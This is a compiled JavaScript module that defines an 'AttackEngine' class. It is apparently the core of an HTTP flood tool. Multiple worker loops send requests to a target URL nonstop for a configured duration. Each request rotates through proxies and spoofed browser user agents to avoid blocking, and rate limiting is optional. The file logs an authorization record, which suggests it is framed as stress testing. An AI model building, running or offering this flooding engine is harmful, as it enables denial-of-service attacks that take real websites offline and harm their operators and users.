"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.AttackEngine = void 0;
const axios_1 = __importDefault(require("axios"));
const proxyManager_1 = require("./proxyManager");
const userAgents_1 = require("./userAgents");
const logger_1 = require("./logger");
const events_1 = require("events");
class AttackEngine extends events_1.EventEmitter {
    constructor(config, authorization = null) {
        super();
        this.active = false;
        this.threads = [];
        this.authorization = null;
        this.config = config;
        this.proxyManager = new proxyManager_1.ProxyManager(config.proxies);
        this.userAgentRotator = new userAgents_1.UserAgentRotator(config.userAgents);
        this.logger = new logger_1.AuditLogger(this.generateAttackId());
        this.authorization = authorization;
        this.stats = {
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            startTime: new Date(),
            bytesSent: 0,
            bytesReceived: 0
        };
    }
    generateAttackId() {
        return `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
    }
    async start() {
        if (this.active) {
            throw new Error('Attack already in progress');
        }
        this.active = true;
        this.stats.startTime = new Date();
        // Log authorization if present
        if (this.authorization) {
            this.logger.logAuthorization(this.authorization.clientId, this.authorization.targetUrl, this.authorization.authorizedBy);
        }
        this.logger.logAttackStart({
            target: this.config.target,
            method: this.config.method,
            threads: this.config.threads,
            duration: this.config.duration,
            proxies: this.proxyManager.getProxyCount(),
            userAgents: this.config.userAgents.length
        });
        // Start worker threads
        for (let i = 0; i < this.config.threads; i++) {
            this.threads.push(this.worker(i));
        }
        // Set duration timer
        setTimeout(() => {
            this.stop();
        }, this.config.duration * 1000);
        await Promise.all(this.threads);
    }
    stop() {
        this.active = false;
        this.stats.endTime = new Date();
        this.logger.logAttackEnd(this.stats);
        this.emit('stop', this.stats);
    }
    getStats() {
        return { ...this.stats };
    }
    async worker(workerId) {
        while (this.active) {
            try {
                await this.sendRequest();
                // Rate limiting
                if (this.config.rateLimit > 0) {
                    await this.sleep(1000 / this.config.rateLimit);
                }
            }
            catch (error) {
                // Worker continues despite errors
            }
        }
    }
    async sendRequest() {
        const proxy = this.proxyManager.getNext();
        const userAgent = this.userAgentRotator.getNext();
        if (!proxy) {
            this.logger.logRequest('none', userAgent, null, 'No proxy available');
            this.stats.failedRequests++;
            this.stats.totalRequests++;
            return;
        }
        const proxyUrl = `${proxy.type}://${proxy.host}:${proxy.port}`;
        const axiosConfig = {
            method: this.config.method,
            url: this.config.target,
            headers: {
                'User-Agent': userAgent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                ...this.config.headers
            },
            timeout: 10000,
            validateStatus: () => true, // Don't throw on any status
            proxy: false // Disable default proxy, we'll use agent
        };
        // Apply proxy agent
        try {
            const agent = this.proxyManager.createAgent(proxy);
            axiosConfig.httpAgent = agent;
            axiosConfig.httpsAgent = agent;
        }
        catch (error) {
            this.proxyManager.markFailed(proxy);
            const errorMsg = error instanceof Error ? error.message : 'Unknown error';
            this.logger.logRequest(proxyUrl, userAgent, null, `Proxy setup failed: ${errorMsg}`);
            this.stats.failedRequests++;
            this.stats.totalRequests++;
            return;
        }
        // Add payload for POST/PUT
        if ((this.config.method === 'POST' || this.config.method === 'PUT') && this.config.payload) {
            axiosConfig.data = this.config.payload;
        }
        try {
            const startTime = Date.now();
            const response = await (0, axios_1.default)(axiosConfig);
            const duration = Date.now() - startTime;
            this.stats.successfulRequests++;
            this.stats.totalRequests++;
            this.stats.bytesSent += JSON.stringify(axiosConfig.headers).length;
            this.stats.bytesReceived += JSON.stringify(response.data).length;
            this.logger.logRequest(proxyUrl, userAgent, response.status);
            this.emit('request', {
                proxy: proxyUrl,
                userAgent,
                status: response.status,
                duration
            });
        }
        catch (error) {
            this.stats.failedRequests++;
            this.stats.totalRequests++;
            const errorMsg = error instanceof Error ? error.message : 'Unknown error';
            this.logger.logRequest(proxyUrl, userAgent, null, errorMsg);
            // Mark proxy as failed if connection error
            if (axios_1.default.isAxiosError(error) && !error.response) {
                this.proxyManager.markFailed(proxy);
            }
            this.emit('error', {
                proxy: proxyUrl,
                userAgent,
                error: errorMsg
            });
        }
    }
    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}
exports.AttackEngine = AttackEngine;
